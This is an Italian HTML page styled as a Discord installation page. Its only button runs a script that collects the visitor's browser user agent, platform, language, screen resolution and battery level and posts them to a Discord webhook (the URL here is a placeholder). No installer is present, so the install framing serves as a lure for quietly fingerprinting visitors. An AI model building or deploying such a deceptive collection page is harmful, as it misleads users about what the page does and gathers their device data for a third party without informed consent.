<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            padding: 20px;
            background-color: #f4f4f4;
            text-align: center;
        }
        button {
            background-color: #007bff; /* Blu */
            color: white; /* Testo bianco */
            padding: 10px 20px; /* Spaziatura interna */
            border: none; /* Nessun bordo */
            border-radius: 5px; /* Bordi arrotondati */
            font-size: 16px; /* Dimensione del testo */
            cursor: pointer; /* Puntatore a mano */
            transition: background-color 0.3s; /* Transizione del colore */
        }
        button:hover {
            background-color: #0056b3; /* Blu pi√π scuro al passaggio del mouse */
        }
    </style>
</head>
<body>

    <h1>Installazione di Discord sotto</h1>
    <button onclick="sendDeviceInfo();">Invia Informazioni</button>

    <script>
        async function sendDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                battery: null
            };

            // Ottieni lo stato della batteria se disponibile
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.battery = {
                    charging: battery.charging,
                    level: (battery.level * 100).toFixed(2) + '%'
                };
            }

            // Crea il payload per Discord
            const payload = {
                embeds: [{
                    title: "Informazioni del Dispositivo",
                    description: "Ecco alcune informazioni sul tuo dispositivo:",
                    color: 0x00ff00, // Verde
                    fields: [
                        { name: 'User Agent', value: deviceInfo.userAgent, inline: true },
                        { name: 'Piattaforma', value: deviceInfo.platform, inline: true },
                        { name: 'Lingua', value: deviceInfo.language, inline: true },
                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution, inline: true },
                        { name: 'Batteria', value: deviceInfo.battery ? `Carica: ${deviceInfo.battery.level}` : 'N/A', inline: true }
                    ],
                    footer: {
                        text: "Messaggio inviato tramite webhook",
                        icon_url: "https://i.imgur.com/AfFp7pu.png" // Icona del footer
                    },
                    thumbnail: {
                        url: "https://i.imgur.com/AfFp7pu.png" // Immagine di anteprima
                    }
                }]
            };

            // Invia il payload al webhook Discord
            const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Informazioni del dispositivo inviate con successo.');
                } else {
                    console.error('Errore nell\'invio delle informazioni:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Errore:', error);
            }
        }
    </script>

</body>
</html>
